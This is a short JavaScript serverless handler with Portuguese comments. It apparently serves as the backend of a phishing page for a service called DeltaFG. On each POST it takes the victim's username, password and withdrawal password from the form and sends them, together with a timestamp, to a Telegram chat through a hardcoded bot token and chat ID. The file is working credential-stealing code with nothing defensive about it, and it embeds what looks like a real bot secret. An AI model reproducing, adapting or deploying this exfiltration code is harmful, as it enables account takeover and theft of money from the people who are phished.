export default async function handler(req, res) {
    if (req.method === 'POST') {
        const userData = req.body;

        // --- CONFIGURAÇÃO DO SEU TELEGRAM ---
        const BOT_TOKEN = "8398397245:AAEssovgH2P4Fwz1bo4xnSt5UDRCVPr3cmM"; // Pegue no @BotFather
        const CHAT_ID = "5132820921";    // Pegue no @userinfobot

        const mensagem = `
🚀 **NOVO CADASTRO - DELTAFG**
👤 Usuário: ${userData.user}
🔑 Senha: ${userData.pass}
💰 Saque: ${userData.withdraw_pass}
⏰ Data: ${userData.timestamp}
        `;

        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: mensagem,
                    parse_mode: 'Markdown'
                })
            });

            return res.status(200).json({ status: 'success' });
        } catch (error) {
            return res.status(500).json({ status: 'error', error: error.message });
        }
    } else {
        res.status(405).json({ message: 'Método não permitido' });
    }
}